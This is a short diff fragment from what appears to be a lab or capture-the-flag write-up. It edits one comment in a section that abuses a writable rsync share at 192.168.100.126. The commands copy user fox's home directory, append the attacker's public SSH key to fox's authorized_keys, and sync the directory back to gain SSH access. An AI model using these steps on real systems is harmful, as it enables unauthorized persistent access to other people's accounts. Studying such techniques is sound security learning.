@@ -73,7 +73,7 @@ The module is read/write, so pull the share down, append our own public key to `
 # pull fox's home locally
 rsync -avh rsync://192.168.100.126:873/fox/ ~/fox
 
-# trust our key (mode 600 on the file, 700 on .ssh)
+# append our key to fox's existing authorized_keys (already mode 600)
 cat ~/.ssh/id_rsa.pub >> ~/fox/.ssh/authorized_keys
 
 # sync the modified home back to the target
